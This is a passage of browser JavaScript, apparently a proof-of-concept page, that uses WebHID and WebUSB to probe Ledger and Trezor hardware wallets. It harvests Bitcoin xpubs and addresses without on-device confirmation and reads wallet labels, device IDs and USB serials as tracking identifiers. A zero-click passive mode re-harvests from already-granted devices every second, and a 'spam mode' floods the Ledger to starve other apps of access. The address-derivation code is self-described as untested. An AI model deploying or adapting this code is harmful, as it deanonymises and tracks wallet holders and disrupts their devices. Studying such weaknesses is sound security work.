      // pull leaf pubkeys (still display=0) and encode addresses
      for (let idx = 0; idx < 3; idx++) {
        try {
          const leaf = await btcNewGetXpub(tp, [
            s.purpose + H,
            0 + H,
            0 + H,
            0,
            idx,
          ]);
          if (leaf.sw !== 0x9000) break;
          const pub = xpubToPubkey(leaf.xpub);
          addAddress(
            `BTC ${s.name} · 0/${idx}`,
            s.enc === "bech32" ? await p2wpkh(pub) : await p2pkh(pub),
            { verify: true }
          );
        } catch (e) {
          log("err", "addr derive: " + ((e && e.message) || e));
          break;
        }
      }
    }
  }
}

/* --- Legacy Bitcoin app (CLA 0xE0): getWalletPublicKey P1=0x00 --- */
async function harvestBtcLegacy(tp) {
  const H = 0x80000000;
  const schemes = [
    {
      name: "Native SegWit",
      purpose: 84,
      p2: 0x02,
      ver: 0x04b24746,
      kind: "zpub",
    }, // m/84'/0'/0'
    {
      name: "Legacy (P2PKH)",
      purpose: 44,
      p2: 0x00,
      ver: 0x0488b21e,
      kind: "xpub",
    }, // m/44'/0'/0'
  ];
  let any = false;
  for (const s of schemes) {
    let acct;
    try {
      acct = await btcGetWalletPubkey(tp, [s.purpose + H, 0 + H, 0 + H], s.p2);
    } catch (e) {
      log("err", "getWalletPublicKey failed: " + ((e && e.message) || e));
      break;
    }
    if (acct.sw !== 0x9000) {
      if (acct.sw === 0x5515) {
        addSecret("BTC", "device locked");
        return;
      }
      addSecret(
        `BTC ${s.name}`,
        `sw=${hx(acct.sw, 4)} — ${esc(LEDGER_SW[acct.sw] || "unsupported")}`
      );
      continue;
    }
    any = true;
    const comp = compressPub(acct.pub);
    const xpub = await serializeXpub(s.ver, 3, (H + 0) >>> 0, acct.chain, comp);
    addSecret(
      `BTC ${s.name} · account ${s.kind}`,
      `<span class="hi break-all">${esc(xpub)}</span> ${pill("no tap", "bad")}`
    );
    log("i", `HARVESTED ${s.kind} (no confirmation): ${xpub}`);
    for (let idx = 0; idx < 3; idx++) {
      try {
        const av = await btcGetWalletPubkey(
          tp,
          [s.purpose + H, 0 + H, 0 + H, 0, idx],
          s.p2
        );
        if (av.sw === 0x9000) addAddress(`BTC ${s.name} · 0/${idx}`, av.addr);
        else break;
      } catch (_) {
        break;
      }
    }
  }
}

/* --- address crypto: base58 decode, RIPEMD-160, hash160, bech32, P2WPKH / P2PKH ---
 *  Written from spec; UNTESTED in this build. The xpub above is device-returned and
 *  authoritative — treat derived addresses as "verify against your wallet".            */
function base58decode(str) {
  let n = 0n;
  for (const ch of str) {
    const i = _B58.indexOf(ch);
    if (i < 0) throw new Error("bad base58 char");
    n = n * 58n + BigInt(i);
  }
  const bytes = [];
  while (n > 0n) {
    bytes.unshift(Number(n & 0xffn));
    n >>= 8n;
  }
  for (let k = 0; k < str.length && str[k] === "1"; k++) bytes.unshift(0);
  return new Uint8Array(bytes);
}
function xpubToPubkey(xpubStr) {
  const raw = base58decode(xpubStr);
  return raw.slice(45, 78);
} // 33-byte compressed key
function ripemd160(data) {
  const rl = [
    0,
    1,
    2,
    3,
    4,
    5,
    6,
    7,
    8,
    9,
    10,
    11,
    12,
    13,
    14,
    15,
    7,
    4,
    13,
    1,
    10,
    6,
    15,
    3,
    12,
    0,
    9,
    5,
    2,
    14,
    11,
    8,
    3,
    10,
    14,
    4,
    9,
    15,
    8,
    1,
    2,
    7,
    0,
    6,
    13,
    11,
    5,
    12,
    1,
    9,
    11,
    10,
    0,
    8,
    12,
    4,
    13,
    3,
    7,
    15,
    14,
    5,
    6,
    2,
    4,
    0,
    5,
    9,
    7,
    12,
    2,
    10,
    14,
    1,
    3,
    8,
    11,
    6,
    15,
    13,
  ];
  const rr = [
    5,
    14,
    7,
    0,
    9,
    2,
    11,
    4,
    13,
    6,
    15,
    8,
    1,
    10,
    3,
    12,
    6,
    11,
    3,
    7,
    0,
    13,
    5,
    10,
    14,
    15,
    8,
    12,
    4,
    9,
    1,
    2,
    15,
    5,
    1,
    3,
    7,
    14,
    6,
    9,
    11,
    8,
    12,
    2,
    10,
    0,
    4,
    13,
    8,
    6,
    4,
    1,
    3,
    11,
    15,
    0,
    5,
    12,
    2,
    13,
    9,
    7,
    10,
    14,
    12,
    15,
    10,
    4,
    1,
    5,
    8,
    7,
    6,
    2,
    13,
    14,
    0,
    3,
    9,
    11,
  ];
  const sl = [
    11,
    14,
    15,
    12,
    5,
    8,
    7,
    9,
    11,
    13,
    14,
    15,
    6,
    7,
    9,
    8,
    7,
    6,
    8,
    13,
    11,
    9,
    7,
    15,
    7,
    12,
    15,
    9,
    11,
    7,
    13,
    12,
    11,
    13,
    6,
    7,
    14,
    9,
    13,
    15,
    14,
    8,
    13,
    6,
    5,
    12,
    7,
    5,
    11,
    12,
    14,
    15,
    14,
    15,
    9,
    8,
    9,
    14,
    5,
    6,
    8,
    6,
    5,
    12,
    9,
    15,
    5,
    11,
    6,
    8,
    13,
    12,
    5,
    12,
    13,
    14,
    11,
    8,
    5,
    6,
  ];
  const sr = [
    8,
    9,
    9,
    11,
    13,
    15,
    15,
    5,
    7,
    7,
    8,
    11,
    14,
    14,
    12,
    6,
    9,
    13,
    15,
    7,
    12,
    8,
    9,
    11,
    7,
    7,
    12,
    7,
    6,
    15,
    13,
    11,
    9,
    7,
    15,
    11,
    8,
    6,
    6,
    14,
    12,
    13,
    5,
    14,
    13,
    13,
    7,
    5,
    15,
    5,
    8,
    11,
    14,
    14,
    6,
    14,
    6,
    9,
    12,
    9,
    12,
    5,
    15,
    8,
    8,
    5,
    12,
    9,
    12,
    5,
    14,
    6,
    8,
    13,
    6,
    5,
    15,
    13,
    11,
    11,
  ];
  const KL = [0x00000000, 0x5a827999, 0x6ed9eba1, 0x8f1bbcdc, 0xa953fd4e];
  const KR = [0x50a28be6, 0x5c4dd124, 0x6d703ef3, 0x7a6d76e9, 0x00000000];
  const rol = (x, n) => ((x << n) | (x >>> (32 - n))) >>> 0;
  const f = (j, x, y, z) =>
    j < 16
      ? x ^ y ^ z
      : j < 32
      ? (x & y) | (~x & z)
      : j < 48
      ? (x | ~y) ^ z
      : j < 64
      ? (x & z) | (y & ~z)
      : x ^ (y | ~z);
  const ml = data.length,
    bitLen = ml * 8;
  const padLen = ml % 64 < 56 ? 56 - (ml % 64) : 120 - (ml % 64);
  const total = ml + padLen + 8;
  const msg = new Uint8Array(total);
  msg.set(data, 0);
  msg[ml] = 0x80;
  for (let i = 0; i < 8; i++)
    msg[total - 8 + i] = Math.floor(bitLen / Math.pow(2, 8 * i)) & 0xff; // 64-bit LE length
  let h0 = 0x67452301,
    h1 = 0xefcdab89,
    h2 = 0x98badcfe,
    h3 = 0x10325476,
    h4 = 0xc3d2e1f0;
  const X = new Array(16);
  for (let off = 0; off < total; off += 64) {
    for (let i = 0; i < 16; i++)
      X[i] =
        (msg[off + i * 4] |
          (msg[off + i * 4 + 1] << 8) |
          (msg[off + i * 4 + 2] << 16) |
          (msg[off + i * 4 + 3] << 24)) >>>
        0;
    let al = h0,
      bl = h1,
      cl = h2,
      dl = h3,
      el = h4,
      ar = h0,
      br = h1,
      cr = h2,
      dr = h3,
      er = h4;
    for (let j = 0; j < 80; j++) {
      let t = (((al + f(j, bl, cl, dl)) >>> 0) + X[rl[j]]) >>> 0;
      t = (t + KL[(j / 16) | 0]) >>> 0;
      t = (rol(t, sl[j]) + el) >>> 0;
      al = el;
      el = dl;
      dl = rol(cl, 10);
      cl = bl;
      bl = t;
      let u = (((ar + f(79 - j, br, cr, dr)) >>> 0) + X[rr[j]]) >>> 0;
      u = (u + KR[(j / 16) | 0]) >>> 0;
      u = (rol(u, sr[j]) + er) >>> 0;
      ar = er;
      er = dr;
      dr = rol(cr, 10);
      cr = br;
      br = u;
    }
    const t = (h1 + cl + dr) >>> 0;
    h1 = (h2 + dl + er) >>> 0;
    h2 = (h3 + el + ar) >>> 0;
    h3 = (h4 + al + br) >>> 0;
    h4 = (h0 + bl + cr) >>> 0;
    h0 = t;
  }
  const out = new Uint8Array(20);
  [h0, h1, h2, h3, h4].forEach((h, i) => {
    out[i * 4] = h & 0xff;
    out[i * 4 + 1] = (h >>> 8) & 0xff;
    out[i * 4 + 2] = (h >>> 16) & 0xff;
    out[i * 4 + 3] = (h >>> 24) & 0xff;
  });
  return out;
}
async function hash160(u8) {
  return ripemd160(await sha256(u8));
}
async function p2pkh(pubkey) {
  const h = await hash160(pubkey);
  const p = new Uint8Array(21);
  p[0] = 0x00;
  p.set(h, 1);
  return base58check(p);
}
const BECH32_CHARSET = "qpzry9x8gf2tvdw0s3jn54khce6mua7l";
function bech32Polymod(values) {
  const GEN = [0x3b6a57b2, 0x26508e6d, 0x1ea119fa, 0x3d4233dd, 0x2a1462b3];
  let chk = 1;
  for (const v of values) {
    const b = chk >>> 25;
    chk = (((chk & 0x1ffffff) << 5) >>> 0) ^ v;
    for (let i = 0; i < 5; i++) if ((b >> i) & 1) chk = (chk ^ GEN[i]) >>> 0;
  }
  return chk >>> 0;
}
function bech32HrpExpand(hrp) {
  const o = [];
  for (const c of hrp) o.push(c.charCodeAt(0) >> 5);
  o.push(0);
  for (const c of hrp) o.push(c.charCodeAt(0) & 31);
  return o;
}
function bech32Checksum(hrp, data) {
  const values = bech32HrpExpand(hrp).concat(data).concat([0, 0, 0, 0, 0, 0]);
  const mod = bech32Polymod(values) ^ 1;
  const out = [];
  for (let i = 0; i < 6; i++) out.push((mod >>> (5 * (5 - i))) & 31);
  return out;
}
function convertBits(data, from, to, pad) {
  let acc = 0,
    bits = 0;
  const out = [];
  const maxv = (1 << to) - 1;
  for (const v of data) {
    acc = ((acc << from) | v) >>> 0;
    bits += from;
    while (bits >= to) {
      bits -= to;
      out.push((acc >>> bits) & maxv);
    }
  }
  if (pad && bits > 0) out.push((acc << (to - bits)) & maxv);
  return out;
}
function bech32Encode(hrp, witver, program) {
  const data = [witver].concat(convertBits(program, 8, 5, true));
  const combined = data.concat(bech32Checksum(hrp, data));
  let out = hrp + "1";
  for (const d of combined) out += BECH32_CHARSET[d];
  return out;
}
async function p2wpkh(pubkey) {
  return bech32Encode("bc", 0, await hash160(pubkey));
}

/* --------- Ledger dashboard extra: battery --------- */
async function ledgerBattery(tp) {
  // best-effort (Stax/Flex); harmless 0x6d00 elsewhere
  try {
    const r = await tp.exchange(new Uint8Array([0xe0, 0x10, 0x00, 0x00, 0x00]));
    if (r.sw === 0x9000 && r.data.length) {
      const b = r.data[0];
      return b >= 0 && b <= 100 ? { pct: b } : { raw: bytesHex(r.data) };
    }
    return { sw: r.sw };
  } catch (e) {
    return { error: (e && e.message) || String(e) };
  }
}

/* ----------------------- HARVEST: Trezor label / id ---------------------- */
function renderTrezorFeatures(f) {
  const label = pStr(f, 10),
    deviceId = pStr(f, 6),
    vendor = pStr(f, 1),
    model = pStr(f, 21),
    language = pStr(f, 9);
  const ver = [pNum(f, 2), pNum(f, 3), pNum(f, 4)]
    .filter((x) => x !== null)
    .join(".");
  const bootloader = pNum(f, 5),
    initialized = pNum(f, 12),
    pass = pNum(f, 8),
    pin = pNum(f, 7);
  renderTable("tActive", [
    ["Transport", pill("WebUSB · protobuf", "info")],
    [
      "Device state",
      bootloader
        ? pill("bootloader mode", "warn")
        : initialized
        ? pill("initialized wallet", "warn")
        : pill("not initialized", "info"),
    ],
    ["Vendor", vendor || "—"],
    ["Model", model ? pill(model, "ok") : "—"],
    ["Firmware", ver ? `<span class="hi">${esc(ver)}</span>` : "—"],
    ["Language", language ? `<span class="hi">${esc(language)}</span>` : "—"],
    ["PIN protection", pin ? pill("on", "ok") : pill("off", "warn")],
    ["Passphrase protection", pass ? pill("on", "ok") : pill("off", "warn")],
  ]);
  if (label !== null)
    addSecret(
      "Trezor wallet name (label)",
      `<span class="hi">${esc(label || "(empty)")}</span> ${pill(
        "no tap",
        "bad"
      )}`
    );
  if (deviceId)
    addSecret(
      "Trezor device_id",
      `<span class="hi">${esc(deviceId)}</span> ${pill(
        "stable tracker",
        "bad"
      )}`
    );
  if (language)
    addSecret(
      "Trezor language",
      `<span class="hi">${esc(language)}</span> ${pill("no tap", "bad")}`
    );
  log(
    "i",
    `Trezor Features: label="${label}" id=${deviceId} model=${model} fw=${ver} lang=${language}`
  );
}

/* --------------------------- flows --------------------------- */
async function handleHidDevice(device, { active }) {
  const { isLedger } = passiveFromHid(device);
  if (active && isLedger) await activeProbe(device);
  else if (!isLedger)
    renderTable("tActive", [
      [
        "Note",
        "Active APDU probe is Ledger-specific; the descriptor fingerprint (left) is generic to any HID device.",
      ],
    ]);
}
async function handleUsbDevice(dev, how) {
  renderUsb(dev, how);
  if (dev.vendorId in TREZOR_VENDORS) {
    try {
      const f = await trezorGetFeatures(dev);
      renderTrezorFeatures(f);
    } catch (e) {
      log("err", "Trezor GetFeatures: " + ((e && e.message) || e));
      renderTable("tActive", [
        ["Trezor probe", pill("failed", "bad")],
        ["Reason", (e && e.message) || String(e)],
        [
          "Likely cause",
          "Trezor Suite / Bridge holds the device — close it and retry",
        ],
      ]);
    }
  }
}
function renderUsb(dev, how) {
  const vendor = KNOWN_USB_VENDORS[dev.vendorId] || "unknown";
  renderTable("tPassive", [
    ["Transport", pill("WebUSB", "info")],
    ["Vendor ID", `${hx(dev.vendorId, 4)} ${pill(vendor, "ok")}`],
    ["Product ID", hx(dev.productId, 4)],
    ["Product name", dev.productName || "—"],
    ["Manufacturer", dev.manufacturerName || "—"],
    ["Serial number", dev.serialNumber ? pill(dev.serialNumber, "bad") : "—"],
    [
      "USB version",
      `${dev.usbVersionMajor}.${dev.usbVersionMinor}.${dev.usbVersionSubminor}`,
    ],
    ["Device class", hx(dev.deviceClass)],
    ["Configurations", (dev.configurations || []).length],
  ]);
  if (dev.serialNumber)
    addSecret(
      "USB serial number",
      `<span class="hi">${esc(dev.serialNumber)}</span> ${pill(
        "stable tracker",
        "bad"
      )}`
    );
  log(
    "i",
    `WebUSB (${how}): ${vendor} pid=${hx(dev.productId, 4)} serial=${
      dev.serialNumber || "(none)"
    }`
  );
}

async function connect() {
  try {
    const devs = await navigator.hid.requestDevice({
      filters: [{ vendorId: LEDGER_VENDOR_ID }],
    });
    if (!devs.length) {
      log("i", "user dismissed the picker");
      return;
    }
    log("i", `granted ${devs.length} device(s) via prompt`);
    for (const d of devs) await handleHidDevice(d, { active: true });
  } catch (e) {
    log("err", "requestDevice: " + ((e && e.message) || e));
  }
}
async function silentScan() {
  try {
    const devs = await navigator.hid.getDevices();
    const ledgers = devs.filter((d) => d.vendorId === LEDGER_VENDOR_ID);
    log(
      "i",
      `getDevices() → ${devs.length} pre-authorized device(s), ${ledgers.length} Ledger`
    );
    if (!devs.length) {
      renderTable("tPassive", [
        ["Silent scan", "no previously-granted devices for this origin"],
      ]);
      return;
    }
    const primary = ledgers[0] || devs[0];
    await handleHidDevice(primary, {
      active: primary.vendorId === LEDGER_VENDOR_ID,
    });
  } catch (e) {
    log("err", "getDevices: " + ((e && e.message) || e));
  }
}
async function usbDetect() {
  try {
    const filters = Object.keys(KNOWN_USB_VENDORS).map((v) => ({
      vendorId: Number(v),
    }));
    const dev = await navigator.usb.requestDevice({ filters });
    await handleUsbDevice(dev, "requestDevice");
  } catch (e) {
    log("err", "usb.requestDevice: " + ((e && e.message) || e));
  }
}

/* --------------------- PASSIVE MODE (zero-click) --------------------- */
let pollTimer = null,
  running = false;
let lastHidKey = null,
  lastUsbKey = null; // re-render the descriptor only when the device changes
const lastApp = {}; // deviceKey -> last running-app name → re-harvest on app switch
const probedUsb = new Set(); // Trezor GetFeatures is static — probe once per device

// Silent, non-logging read of which app is open — lets passive mode notice an app switch.
async function peekApp(device) {
  const tp = new LedgerHID(device);
  try {
    await tp.open();
    const r = await tp.exchange(
      new Uint8Array([0xb0, 0x01, 0x00, 0x00, 0x00]),
      { quiet: true }
    );
    if (r.sw !== 0x9000) return "sw:" + hx(r.sw, 4);
    return parseAppAndVersion(r.data).name || "?";
  } catch (_) {
    return null;
  }
}

async function runPassive(force = false) {
  if (running) return;
  running = true;
  try {
    let hidDevs = [],
      usbDevs = [];
    if ("hid" in navigator) hidDevs = await navigator.hid.getDevices();
    if ("usb" in navigator) {
      try {
        usbDevs = await navigator.usb.getDevices();
      } catch (_) {}
    }

    if (hidDevs.length) {
      const primary =
        hidDevs.find((d) => d.vendorId === LEDGER_VENDOR_ID) || hidDevs[0];
      const key = devKey(primary);
      if (force || key !== lastHidKey) {
        lastHidKey = key;
        passiveFromHid(primary);
      } // descriptor render only on change
      if (primary.vendorId === LEDGER_VENDOR_ID) {
        const app = await peekApp(primary); // quiet — no log spam each tick
        if (force || lastApp[key] !== app) {
          // first sight OR app switched
          lastApp[key] = app;
          log(
            "i",
            `passive mode: app="${app}" — probing + harvesting without any click…`
          );
          await activeProbe(primary); // addSecret de-dupes; list is preserved
        }
      }
      return;
    }
    if (usbDevs.length) {
      const primary =
        usbDevs.find((d) => d.vendorId in TREZOR_VENDORS) || usbDevs[0];
      const key = devKey(primary);
      if (force || key !== lastUsbKey || !probedUsb.has(key)) {
        lastUsbKey = key;
        probedUsb.add(key);
        await handleUsbDevice(primary, "getDevices (silent)");
      }
      return;
    }
    if (force && lastHidKey === null && lastUsbKey === null)
      log(
        "i",
        "passive scan: nothing granted to this origin yet (grant once, then it runs itself)"
      );
    lastHidKey = null;
    lastUsbKey = null;
  } catch (e) {
    log("err", "passive scan: " + ((e && e.message) || e));
  } finally {
    running = false;
  }
}
function setPassive(on, { fromUser = false } = {}) {
  $("passive").checked = on;
  const s = $("passiveState");
  s.textContent = on ? "on" : "off";
  s.className = "pill " + (on ? "ok" : "warn");
  try {
    localStorage.setItem("mode_passive", on ? "1" : "0");
  } catch (_) {}
  if (on) {
    if (fromUser)
      log("i", "passive mode ENABLED — auto-scanning; no clicks required");
    lastHidKey = null;
    lastUsbKey = null;
    runPassive(true);
    if (!pollTimer) pollTimer = setInterval(() => runPassive(false), 1000);
  } else {
    if (fromUser) log("i", "passive mode disabled — back to manual buttons");
    if (pollTimer) {
      clearInterval(pollTimer);
      pollTimer = null;
    }
  }
}

/* --------------------- SPAM MODE (USB channel hog) --------------------- *
 *  WebHID has no "NOP" primitive; the closest is repeatedly sending an OUT report
 *  (HIDDevice.sendReport). We fire one benign framed APDU packet/second — the device
 *  serialises USB work, so a steady stream contends with other hosts (Ledger Live).
 *  Fire-and-forget: we don't read the reply, and we defer while a real exchange is in
 *  flight so responses never cross-talk. Raise the frequency for a stronger effect.    */
let spamTimer = null,
  spamCount = 0,
  spamWindow = [];
function spamStatus(msg) {
  const now = Date.now();
  spamWindow = spamWindow.filter((t) => t > now - 1000);
  const rate = spamWindow.length;
  const bar = $("spamBar"),
    txt = $("spamText");
  if (bar) bar.style.width = Math.min(100, rate * 20) + "%"; // 5/s → full bar
  if (txt)
    txt.textContent = msg ? msg : `${spamCount} NOP packets · ~${rate}/s`;
}
async function spamTick() {
  if (!spamTimer) return;
  let led = null;
  try {
    led = (await navigator.hid.getDevices()).find(
      (d) => d.vendorId === LEDGER_VENDOR_ID
    );
  } catch (_) {}
  if (!led) {
    spamStatus("waiting for a granted Ledger…");
    return;
  }
  if (inFlight > 0) {
    spamStatus(`${spamCount} NOP packets · deferring (bus busy)`);
    return;
  } // don't corrupt a real exchange
  try {
    if (!led.opened) await led.open();
    const pkt = makeBlocks(
      0x0101,
      new Uint8Array([0xb0, 0x01, 0x00, 0x00, 0x00])
    )[0]; // one 64-byte NOP report
    await led.sendReport(0, pkt); // fire-and-forget
    spamCount++;
    spamWindow.push(Date.now());
    spamStatus();
  } catch (e) {
    spamStatus("err: " + ((e && e.message) || e));
  }
}
function setSpam(on, { fromUser = false } = {}) {
  $("spam").checked = on;
  try {
    localStorage.setItem("mode_spam", on ? "1" : "0");
  } catch (_) {}
  if (on) {
    if (fromUser)
      log(
        "i",
        "SPAM mode ENABLED — flooding the Ledger with NOP reports to starve other hosts"
      );
    if (!spamTimer) spamTimer = setInterval(spamTick, 1000);
    spamTick();
  } else {
    if (spamTimer) {
      clearInterval(spamTimer);
      spamTimer = null;
    }
    if (fromUser) log("i", "spam mode disabled");
    spamStatus("idle");
  }
}

/* ----------------------- capability banner ----------------------- */
function caps() {
  const hid = "hid" in navigator;
  const usb = "usb" in navigator;
  const secure = window.isSecureContext;
  const capabilities = [
    ["Secure context", secure ? pill("Secure", "ok") : pill("Blocked", "bad")],
    ["WebHID", hid ? pill("Available", "ok") : pill("Unavailable", "bad")],
    ["WebUSB", usb ? pill("Available", "ok") : pill("Unavailable", "warn")],
    ["Origin", `<span class="origin-value">${esc(location.origin)}</span>`],
  ];
  $("caps").innerHTML = capabilities
    .map(
      ([label, value]) =>
        `<div class="capability"><dt>${label}</dt><dd>${value}</dd></div>`
    )
    .join("");
  const usable = hid && secure;
  $("btnConnect").disabled = !usable;
  $("btnSilent").disabled = !usable;
  $("btnUsb").disabled = !usb || !secure;
  $("passive").disabled = !usable;
  $("spam").disabled = !usable;
  const ready = secure && (hid || usb);
  $("browserState").textContent = ready
    ? "Browser ready"
    : "Browser unsupported";
  $("browserState").classList.toggle("unavailable", !ready);
  $("compatibilityNote").hidden = usable && usb;
  return usable;
}

/* ----------------------------- wire ----------------------------- */
$("btnConnect").onclick = connect;
$("btnSilent").onclick = silentScan;
$("btnUsb").onclick = usbDetect;
$("btnClearLog").onclick = () => {
  $("log").innerHTML = "";
  log("i", "log cleared");
};
$("btnClearList").onclick = () => {
  resetSecrets();
  log("i", "harvested address list cleared");
};
$("helpBtn").onclick = () => {
  const b = $("helpBox");
  b.hidden = !b.hidden;
  $("helpBtn").setAttribute("aria-expanded", String(!b.hidden));
};
$("passive").addEventListener("change", (e) =>
  setPassive(e.target.checked, { fromUser: true })
);
$("spam").addEventListener("change", (e) =>
  setSpam(e.target.checked, { fromUser: true })
);

const usable = caps();
log(
  "i",
  "ready. Plug in a device, then Connect — or flip on Passive mode for zero-click recon + harvest."
);
if ("hid" in navigator) {
  navigator.hid.addEventListener("connect", (e) => {
    log("i", `hot-plug: HID connected pid=${hx(e.device.productId, 4)}`);
    if ($("passive").checked) runPassive(true);
  });
  navigator.hid.addEventListener("disconnect", (e) => {
    log("i", `hot-plug: HID disconnected pid=${hx(e.device.productId, 4)}`);
    lastHidKey = null;
  });
}
let want = true;
try {
  const v = localStorage.getItem("mode_passive");
  if (v !== null) want = v === "1";
} catch (_) {}
setPassive(usable ? want : false);

let wantSpam = false;
try {
  const v = localStorage.getItem("mode_spam");
  if (v !== null) wantSpam = v === "1";
} catch (_) {}
setSpam(usable ? wantSpam : false);
